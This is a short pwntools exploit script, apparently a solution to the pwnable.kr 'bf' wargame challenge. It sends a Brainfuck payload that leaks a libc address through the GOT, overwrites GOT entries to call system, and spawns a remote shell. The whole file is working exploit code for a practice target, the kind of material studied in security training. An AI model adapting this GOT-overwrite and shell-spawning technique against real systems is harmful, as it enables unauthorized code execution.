#!/usr/bin/env python3
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

libc = ELF("./bf_libc.so")
r = remote("pwnable.kr", 9001)
#r = process("./bf", env = {"LD_PRELOAD" : "./bf_libc.so"})
#gdb.attach(proc.pidof(r)[0])

r.recvlines(2)

setvbuf_got = 0x0804a028
putchar_got = 0x0804a030
stdout      = 0x0804a060
buf         = 0x0804a070
tape        = 0x0804a0a0
main        = 0x08048671

payload = ''.join(['<' * (tape - setvbuf_got), '.>.>.>.', '<<<',        # leak setvbuf address
                   ',>,>,>,', '<<<',                                    # setvbuf got = system
                   '>' * (putchar_got - setvbuf_got), ',>,>,>,', '<<<', # putchar got = main
                   '>' * (stdout - putchar_got), ',>,>,>,', '<<<',      # stdout = buf
                   '>' * (buf - stdout), ',>,>,',                       # buf = 'sh\x00'
                   '.'                                                  # return to main
                   ])
assert(len(payload) <= 1024)

r.sendline(payload)

libc.address = u32(r.recvn(4)) - libc.symbols[b"setvbuf"]
print("libc address : ", hex(libc.address))

r.send(p32(libc.symbols[b"system"]))
r.send(p32(main))
r.send(p32(buf))
r.send("sh\x00")

r.interactive()
